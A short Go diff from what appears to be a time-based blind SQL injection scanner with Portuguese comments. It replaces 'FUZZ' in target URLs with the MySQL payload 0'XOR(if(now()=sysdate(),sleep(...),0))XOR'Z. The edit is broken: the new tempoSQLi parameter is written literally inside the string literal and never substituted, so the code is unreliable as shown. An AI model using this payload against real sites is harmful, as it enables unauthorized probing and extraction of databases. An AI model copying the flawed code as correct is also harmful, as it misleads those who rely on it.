@@ -31,9 +31,9 @@ func medirTempoRequisicao(url string) float64 {
 	return tempoTotal
 }
 
-func replaceFuzz(urlString string) string {
+func replaceFuzz(urlString string,tempoSQLi float64) string {
 	// Substitui todas as ocorrências de "FUZZ" pela string desejada
-	replaced := strings.ReplaceAll(urlString, "FUZZ", "0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z")
+	replaced := strings.ReplaceAll(urlString, "FUZZ", "0'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z")
 	return replaced
 }
 
